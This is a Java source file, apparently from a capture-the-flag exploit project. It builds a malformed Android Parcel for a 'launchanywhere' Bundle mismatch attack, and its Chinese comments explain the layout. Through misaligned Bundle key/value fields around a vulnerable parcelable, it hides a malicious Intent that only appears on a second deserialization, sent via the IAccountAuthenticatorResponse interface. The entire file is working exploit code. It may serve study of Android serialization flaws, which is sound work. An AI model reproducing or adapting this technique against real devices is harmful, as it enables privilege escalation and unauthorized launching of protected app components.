package com.test.chall_exploit;

import android.content.Intent;
import android.os.Parcel;

public class expVulnParcel implements IGenerateMalformedParcel{
    private static final int VAL_PARCELABLE = 4;
    private static final int VAL_INTEGER = 1;
    private static final int VAL_BYTEARRAY = 13;

    @Override
    public Parcel generate(Intent intent) {

        //Bundle bundle = new Bundle();
        Parcel obtain = Parcel.obtain();
        Parcel obtain2 = Parcel.obtain();
        Parcel obtain3 = Parcel.obtain();
        // 准备工作
        obtain.writeInterfaceToken("android.accounts.IAccountAuthenticatorResponse"); // 相当于3次writeInt
        obtain.writeInt(1);
        // 最外层obtain是一个Bundle
        int bundleLenPos = obtain.dataPosition();
        obtain.writeInt(-1);
        obtain.writeInt(0x4c444E42);

        obtain2.writeInt(3); // Bundle的键值对数目
        // 1. 依次构造Bundle中的三个键值对
        obtain2.writeString("launchanywhere"); // key string 1 (android.os.VulnParcelable的键值对)
        obtain2.writeInt(VAL_PARCELABLE);
        obtain2.writeString("android.os.VulnParcelable");
        obtain2.writeInt(1); // opt
        obtain2.writeInt(0); // o2 
        obtain2.writeInt(0); // size

        // 长度为13的string实际上会占用28字节
        obtain2.writeInt(13); // key string 2
        obtain2.writeInt(3); // new key string 2
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(13); // new value 2: VAL_BYTEARRAY (try to cover until the position right before "intent")
        obtain2.writeInt(56); // size
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(1); // value 2: VAL_INTEGER
        obtain2.writeInt(1); // int
        obtain2.writeInt(13); // key string 3
        obtain2.writeInt(22);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(13); // value 3: VAL_BYTEARRAY
        obtain2.writeInt(-1); // size域占位，在这个ByteArray里藏了一个intent的键值对；第一次读看不到，第二次读会露出来

        // 2. 隐藏的恶意intent的键值对
        int dataPosition = obtain2.dataPosition();
        obtain2.writeString("intent"); // new key string 3
        obtain2.writeInt(VAL_PARCELABLE); // new value 3
        obtain2.writeString("android.content.Intent");
        // obtain3用于存储想要launch的intent的序列化数据
        intent.writeToParcel(obtain3, 0);
        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
        // 设置ByteArray的size域
        int dataPosition2 = obtain2.dataPosition();
        obtain2.setDataPosition(dataPosition - 4);
        obtain2.writeInt(dataPosition2 - dataPosition);
        obtain2.setDataPosition(dataPosition2);

        // 3. 设置obtain也即Bundle的size域，然后把obtain2中的键值对们加进去
        int dataSize = obtain2.dataSize();
        obtain.setDataPosition(bundleLenPos); // 不再是0了
        obtain.writeInt(dataSize);
        obtain.writeInt(0x4c444E42); 
        obtain.appendFrom(obtain2, 0, dataSize);
        obtain.setDataPosition(0);

        return obtain;
    }
}